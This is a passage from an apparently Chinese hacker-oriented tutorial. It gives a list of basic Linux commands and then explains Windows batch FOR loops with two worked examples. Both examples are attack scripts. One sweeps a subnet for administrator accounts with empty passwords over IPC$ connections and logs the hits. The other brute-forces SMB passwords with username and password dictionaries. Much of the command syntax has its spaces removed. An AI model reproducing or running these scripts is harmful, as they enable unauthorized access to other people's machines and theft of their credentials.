              　　参数说明：/M列出当前进程加载的dll文件，/SVC显示出每个进程对应的服务，无参数时就只列出当前的进程。

              　　Linux系统下基本命令：要区分大小写

              　　uname显示版本信息（同win2K的ver）

              　　dir显示当前目录文件,ls-al显示包括隐藏文件（同win2K的dir）

              　　pwd查询当前所在的目录位置

              　　cdcd..回到上一层目录，注意cd与..之间有空格。cd/返回到根目录。

              　　cat文件名查看文件内容

              　　cat>abc.txt往abc.txt文件中写上内容。

              　　more文件名以一页一页的方式显示一个文本文件。

              　　cp复制文件

              　　mv移动文件

              　　rm文件名删除文件，rm-a目录名删除目录及子目录

              　　mkdir目录名建立目录

              　　rmdir删除子目录，目录内没有文档。

              　　chmod设定档案或目录的存取权限

              　　grep在档案中查找字符串

              　　diff档案文件比较

              　　find档案搜寻

              　　date现在的日期、时间

              　　who查询目前和你使用同一台机器的人以及Login时间地点

              　　w查询目前上机者的详细资料

              　　whoami查看自己的帐号名称

              　　groups查看某人的Group

              　　passwd更改密码

              　　history查看自己下过的命令

              　　ps显示进程状态

              　　kill停止某进程

              　　gcc黑客通常用它来编译C语言写的文件

              　　su权限转换为指定使用者

              　　telnetIPtelnet连接对方主机（同win2K），当出现bash$时就说明连接成功。

              　　ftpftp连接上某服务器（同win2K）
                  附：批处理命令与变量

                    　　1：for命令及变量基本格式：

                    　　FOR/参数%variableIN(set)DOcommand[command_parameters]%variable:指定一个单一字母可替换的参数，如：%i，而指定一个变量则用：%%i，而调用变量时用：%i%，变量是区分大小写的（%i不等于%I）。

                    　　批处理每次能处理的变量从%0―%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2―%9指输入的第2-9个值；例：netuse\\ip\ipc$pass/user:user中ip为%1,pass为%2,user为%3

                    　　(set):指定一个或一组文件，可使用通配符，如：(D:\user.txt)和(11254)(1-1254),{“(11254)”第一个"1"指起始值，第二个"1"指增长量，第三个"254"指结束值，即：从1到254；“(1-1254)”说明：即从254到1}

                    　　command：指定对第个文件执行的命令，如：netuse命令；如要执行多个命令时，命令这间加：&来隔开

                    　　command_parameters：为特定命令指定参数或命令行开关

                    　　IN(set)：指在(set)中取值；DOcommand：指执行command

                    　　参数：/L指用增量形式{(set)为增量形式时}；/F指从文件中不断取值，直到取完为止{(set)为文件时，如(d:\pass.txt)时}。

                    　　用法举例：

                    　　@echooff

                    　　echo用法格式：test.bat*.*.*>test.txt

                    　　for/L%%Gin(11254)doecho%1.%%G>>test.txt&netuse\\%1.%%G/user:administrator|find"命令成功完成">>test.txt

                    　　存为test.bat说明：对指定的一个C类网段的254个IP依次试建立administrator密码为空的IPC$连接，如果成功就把该IP存在test.txt中。

                    　　/L指用增量形式（即从1-254或254-1）；输入的IP前面三位：*.*.*为批处理默认的%1；%%G为变量(ip的最后一位）；&用来隔开echo和netuse这二个命令；|指建立了ipc$后，在结果中用find查看是否有"命令成功完成"信息；%1.%%G为完整的IP地址；(11254)指起始值，增长量，结止值。

                    　　@echooff

                    　　echo用法格式：ok.batip

                    　　FOR/F%%iIN(D:\user.dic)DOsmb.exe%1%%iD:\pass.dic200

                    　　存为：ok.exe说明：输入一个IP后，用字典文件d:\pass.dic来暴解d:\user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入的IP地址（默认）。 

 
 
 
 
 